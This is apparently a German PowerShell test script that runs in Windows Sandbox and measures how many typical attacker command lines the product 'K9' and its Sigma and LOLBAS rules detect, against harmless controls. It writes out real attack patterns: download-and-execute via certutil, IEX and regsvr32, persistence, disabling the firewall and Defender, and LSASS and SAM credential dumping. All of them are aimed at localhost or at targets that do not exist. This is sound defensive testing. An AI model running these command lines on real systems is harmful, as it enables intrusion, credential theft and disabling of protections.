<#
  Testlauf "Regeln fuer Programmstarts" IN DER WINDOWS-SANDBOX (offline).
  Misst, wie viele typische Angreifer-Befehlszeilen K9 meldet - mit den eigenen Regeln, mit den
  Sigma-Regeln (Paket core) und mit den LOLBAS-Regeln (Sigma, Stufe mittel) - und ob harmlose
  Befehle still bleiben.

  KEINE Schadsoftware, kein Netzwerk: Jeder Befehl ist ein Windows-eigenes Programm mit einer
  Befehlszeile, wie Angreifer sie benutzen, aber ohne Wirkung - Adressen zeigen auf den eigenen
  Rechner (127.0.0.1, Port 9, dort lauscht nichts), Ziele liegen in C:\Users\Public\k9t,
  geloescht wird nur Nichtvorhandenes. Alles geschieht in der Sandbox, die danach verworfen wird.
  Laeuft nur im Sandbox-Konto UND wenn der Projektordner nicht existiert (also nie auf dem PC).

  Die Regelpakete kommen vom PC (C:\Testlabor\quellen, nur lesbar), nicht aus dem Internet.

  Start: Doppelklick auf scripts\sandbox\k9-test-regeln.wsb (startet dieses Skript selbst).
  Ergebnis: Dokumente\Virenscanner-Sandbox-Ergebnis\regeln\ergebnis.txt
#>
$ErrorActionPreference = 'Continue'
if ($env:USERNAME -ne 'WDAGUtilityAccount' -or (Test-Path 'C:\K9-Quelltext')) {
    Write-Host 'Nur in der Windows-Sandbox ausfuehren.'
    exit 1
}
$out = 'C:\Ergebnis\regeln'
$prog = 'C:\Testlabor\programm'
$k9 = 'C:\Program Files\K9\k9.exe'
$ziel = 'C:\Users\Public\k9t'
$beginn = Get-Date
New-Item -ItemType Directory -Force $out, $ziel | Out-Null
Start-Transcript -Path (Join-Path $out 'protokoll.txt') | Out-Null
function Step([string]$t) { Write-Host "`n=== $t ($(Get-Date -Format HH:mm:ss))" }
function Warten([int]$sekunden, [string]$text) {
    for ($i = $sekunden; $i -gt 0; $i--) {
        try { $Host.UI.RawUI.WindowTitle = "K9-Test Regeln seit $($beginn.ToString('HH:mm')) Uhr - $text (noch $i s)" } catch {}
        Start-Sleep 1
    }
}
Write-Host "TEST GESTARTET um $(Get-Date -Format HH:mm:ss) Uhr am $(Get-Date -Format dd.MM.yyyy)" -ForegroundColor Cyan

Step 'A K9 installieren, Regelpakete einspielen, Schalter sigma und lolbas an'
& "$prog\k9.exe" dienst installieren 2>&1 | Out-String | Write-Host
for ($i = 0; $i -lt 60 -and -not (Get-Process k9-agent -ErrorAction SilentlyContinue); $i++) { Start-Sleep 2 }
& $k9 --version
$quellen = 'C:\ProgramData\K9\quellen'
New-Item -ItemType Directory -Force "$quellen\sigma", "$quellen\lolbas" | Out-Null
Copy-Item 'C:\Testlabor\quellen\sigma_core.zip' "$quellen\sigma\sigma_core.zip" -Force
Copy-Item 'C:\Testlabor\quellen\lolbas_sigma.json' "$quellen\lolbas\lolbas_sigma.json" -Force
Write-Host "  sigma_core.zip: $((Get-Item "$quellen\sigma\sigma_core.zip" -ErrorAction SilentlyContinue).Length) Bytes, lolbas_sigma.json: $((Get-Item "$quellen\lolbas\lolbas_sigma.json" -ErrorAction SilentlyContinue).Length) Bytes"
& $k9 funktion sigma an 2>&1 | Out-String | Write-Host
& $k9 funktion lolbas an 2>&1 | Out-String | Write-Host
Warten 75 'Dienst uebernimmt die Schalter und laedt die Regeln'

# Number of lines of the service log (the log of the day).
function LogZeilen { @(Get-ChildItem 'C:\ProgramData\K9\logs' -Filter 'dienst.log*' -File -ErrorAction SilentlyContinue | ForEach-Object { Get-Content $_.FullName -ErrorAction SilentlyContinue }) }
$geladen = @(LogZeilen | Where-Object { $_ -match 'Regeln geladen' })
$geladen | ForEach-Object { Write-Host "  $($_.Substring([Math]::Min(28, $_.Length)))" }

$ergebnis = @()
$tabelle = @()
# One test: runs the program (hidden, at most 12 seconds), waits for the service and counts
# the new findings of the service log by their origin.
function Probe([string]$nr, [string]$art, [string]$was, [string]$exe, [string]$argumente) {
    Step "$nr $was"
    $vorher = @(LogZeilen).Count
    Write-Host "  $exe $argumente"
    try {
        # An empty argument list is an error for Start-Process (run of 22.11.2026: notepad did not start).
        $p = if ($argumente) { Start-Process $exe -ArgumentList $argumente -PassThru -WindowStyle Hidden -ErrorAction Stop } else { Start-Process $exe -PassThru -WindowStyle Hidden -ErrorAction Stop }
        if (-not $p.WaitForExit(12000)) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue; Write-Host '  nach 12 s beendet' }
    } catch { Write-Host "  nicht gestartet: $($_.Exception.Message)"; $script:tabelle += [pscustomobject]@{ Nr = $nr; Art = $art; Was = $was; K9 = 0; Sigma = 0; Lolbas = 0; Titel = 'NICHT GESTARTET' }; return }
    Warten 7 'Meldungen des Dienstes'
    $neu = @(LogZeilen | Select-Object -Skip $vorher | Where-Object { $_ -match ' Fund: ' } | ForEach-Object { ($_ -split ' Fund: ', 2)[1] })
    $sigma = @($neu | Where-Object { $_ -like 'Sigma-Regel*' })
    $lolbas = @($neu | Where-Object { $_ -like 'LOLBAS-Regel*' })
    $eigen = @($neu | Where-Object { $_ -notlike 'Sigma-Regel*' -and $_ -notlike 'LOLBAS-Regel*' })
    $titel = @($neu | ForEach-Object { ($_ -split ' . Prozess ', 2)[0] } | ForEach-Object { $_.Substring(0, [Math]::Min(90, $_.Length)) } | Select-Object -Unique) -join ' || '
    $script:tabelle += [pscustomobject]@{ Nr = $nr; Art = $art; Was = $was; K9 = $eigen.Count; Sigma = $sigma.Count; Lolbas = $lolbas.Count; Titel = $titel }
    Write-Host "  -> K9 eigene Regeln: $($eigen.Count), Sigma: $($sigma.Count), LOLBAS: $($lolbas.Count)" -ForegroundColor Yellow
}

$leer = '{00000000-0000-0000-0000-000000000000}'
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output k9t05'))
Copy-Item "$env:WINDIR\System32\cmd.exe" "$ziel\svchost.exe" -Force

# --- Befehlszeilen, wie Angreifer sie benutzen (ohne Wirkung) ---
Probe 'A01' 'Angriff' 'certutil laedt eine Datei aus dem Netz' 'certutil.exe' "-urlcache -split -f http://127.0.0.1:9/k9t01.exe $ziel\k9t01.exe"
Probe 'A02' 'Angriff' 'bitsadmin laedt eine Datei aus dem Netz' 'bitsadmin.exe' "/transfer k9t02 /download /priority high http://127.0.0.1:9/a.exe $ziel\k9t02.exe"
Probe 'A03' 'Angriff' 'mshta fuehrt Skript aus der Befehlszeile aus' 'mshta.exe' 'vbscript:Close(Execute("k9t03=1"))'
Probe 'A04' 'Angriff' 'PowerShell mit verstecktem, kodiertem Befehl' 'powershell.exe' "-NoProfile -WindowStyle Hidden -EncodedCommand $b64"
Probe 'A05' 'Angriff' 'PowerShell laedt Code aus dem Netz und fuehrt ihn aus' 'powershell.exe' "-nop -w hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/k9t05')`""
Probe 'A06' 'Angriff' 'regsvr32 laedt ein Skript aus dem Netz (Squiblydoo)' 'regsvr32.exe' '/s /n /u /i:http://127.0.0.1:9/k9t06.sct scrobj.dll'
Probe 'A07' 'Angriff' 'geplante Aufgabe beim Anmelden fuer ein Programm in Public' 'schtasks.exe' "/create /tn k9t07 /tr $ziel\k9t07.exe /sc onlogon /f"
& schtasks.exe /delete /tn k9t07 /f 2>&1 | Out-Null
Probe 'A08' 'Angriff' 'Autostart-Eintrag (Run) fuer ein Programm in Public' 'reg.exe' "add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v k9t08 /d $ziel\k9t08.exe /f"
& reg.exe delete 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v k9t08 /f 2>&1 | Out-Null
Probe 'A09' 'Angriff' 'Schattenkopien loeschen (nicht vorhandene Kopie)' 'vssadmin.exe' "delete shadows /shadow=$leer /quiet"
Probe 'A10' 'Angriff' 'Ereignisprotokoll leeren (nicht vorhandenes Protokoll)' 'wevtutil.exe' 'cl k9t10-nicht-vorhanden'
Probe 'A11' 'Angriff' 'Systemdatei-Name am falschen Ort (svchost.exe in Public)' "$ziel\svchost.exe" '/c echo k9t11'
Probe 'A12' 'Angriff' 'certutil dekodiert eine Datei' 'certutil.exe' "-decode $ziel\k9t12.b64 $ziel\k9t12.exe"
Probe 'A13' 'Angriff' 'curl laedt eine .exe nach Public' 'curl.exe' "-o $ziel\k9t13.exe http://127.0.0.1:9/a.exe"
Probe 'A14' 'Angriff' 'Windows-Firewall abschalten' 'netsh.exe' 'advfirewall set allprofiles state off'
& netsh.exe advfirewall set allprofiles state on 2>&1 | Out-Null
Probe 'A15' 'Angriff' 'Defender-Echtzeitschutz abschalten' 'powershell.exe' '-NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
Probe 'A16' 'Angriff' 'Speicherabbild ueber comsvcs.dll (Muster LSASS, hier Prozess 0)' 'rundll32.exe' "C:\Windows\System32\comsvcs.dll, MiniDump 0 $ziel\k9t16.dmp full"
Probe 'A17' 'Angriff' 'Kontendatenbank SAM sichern' 'reg.exe' "save HKLM\SAM $ziel\k9t17.hiv /y"
Probe 'A18' 'Angriff' 'Erkundung: whoami /priv' 'whoami.exe' '/priv'
Probe 'A19' 'Angriff' 'Erkundung: Administratoren auflisten' 'net.exe' 'localgroup administrators'
Probe 'A20' 'Angriff' 'cmd startet PowerShell mit Download-Befehl' 'cmd.exe' "/c powershell -nop -c `"(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:9/a.exe','$ziel\k9t20.exe')`""

# --- Harmlose Befehle (keine Meldung erwartet) ---
Probe 'H01' 'Harmlos' 'Ordner auflisten' 'cmd.exe' '/c dir C:\'
Probe 'H02' 'Harmlos' 'PowerShell zeigt das Datum' 'powershell.exe' '-NoProfile -Command "Get-Date"'
Probe 'H03' 'Harmlos' 'Netzwerkeinstellungen anzeigen' 'ipconfig.exe' '/all'
Probe 'H04' 'Harmlos' 'Editor oeffnen' 'notepad.exe' ''
Probe 'H05' 'Harmlos' 'Eintrag der Systemsteuerung oeffnen' 'rundll32.exe' 'shell32.dll,Control_RunDLL'
Probe 'H06' 'Harmlos' 'certutil zeigt den Hashwert einer Datei' 'certutil.exe' "-hashfile $env:WINDIR\System32\notepad.exe SHA256"
Get-Process notepad, control, SystemSettings -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item $ziel -Recurse -Force -ErrorAction SilentlyContinue

Step 'Ergebnisse sammeln'
& $k9 erkennungen --alle *> (Join-Path $out 'erkennungen.txt')
Get-ChildItem 'C:\ProgramData\K9\logs' -File -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName (Join-Path $out ('log-' + $_.Name + '.txt')) }

$ergebnis += "K9 $((& $k9 --version 2>&1 | Out-String).Trim()); geladen: $(@($geladen | ForEach-Object { ($_ -split 'INFO ', 2)[1] }) -join ' | ')"
$ergebnis += ''
$ergebnis += 'Nr  | Art     | K9 | Sigma | LOLBAS | Was | Meldungen'
foreach ($z in $tabelle) {
    $ergebnis += ('{0} | {1,-7} | {2,2} | {3,5} | {4,6} | {5} | {6}' -f $z.Nr, $z.Art, $z.K9, $z.Sigma, $z.Lolbas, $z.Was, $z.Titel)
}
$a = @($tabelle | Where-Object { $_.Art -eq 'Angriff' -and $_.Titel -ne 'NICHT GESTARTET' })
$h = @($tabelle | Where-Object { $_.Art -eq 'Harmlos' -and $_.Titel -ne 'NICHT GESTARTET' })
$ergebnis += ''
$ergebnis += "Angriffs-Befehlszeilen gelaufen: $($a.Count)"
$ergebnis += "  gemeldet von den eigenen Regeln von K9 : $(@($a | Where-Object { $_.K9 -gt 0 }).Count)"
$ergebnis += "  gemeldet von Sigma (core)              : $(@($a | Where-Object { $_.Sigma -gt 0 }).Count)"
$ergebnis += "  gemeldet von LOLBAS (Sigma mittel)     : $(@($a | Where-Object { $_.Lolbas -gt 0 }).Count)"
$ergebnis += "  von irgendeiner Regel gemeldet         : $(@($a | Where-Object { $_.K9 + $_.Sigma + $_.Lolbas -gt 0 }).Count)"
$ergebnis += "  nur dank Sigma oder LOLBAS gemeldet    : $(@($a | Where-Object { $_.K9 -eq 0 -and ($_.Sigma + $_.Lolbas) -gt 0 }).Count)"
$ergebnis += "  von keiner Regel gemeldet              : $(@($a | Where-Object { $_.K9 + $_.Sigma + $_.Lolbas -eq 0 }).Count)"
$ergebnis += "Harmlose Befehle gelaufen: $($h.Count), davon gemeldet (Fehlalarm): $(@($h | Where-Object { $_.K9 + $_.Sigma + $_.Lolbas -gt 0 }).Count)"
$ergebnis | Set-Content (Join-Path $out 'ergebnis.txt') -Encoding UTF8
Stop-Transcript | Out-Null
Write-Host "`n================ ERGEBNIS ================" -ForegroundColor Cyan
$ergebnis | ForEach-Object { Write-Host $_ }
Write-Host "`nTest gestartet um $($beginn.ToString('HH:mm:ss')) Uhr, beendet um $(Get-Date -Format HH:mm:ss) Uhr."
Write-Host 'Fertig. Ergebnisse liegen auf dem PC in Dokumente\Virenscanner-Sandbox-Ergebnis\regeln. Die Sandbox schliesst sich in 60 Sekunden.'
& shutdown.exe /s /f /t 60
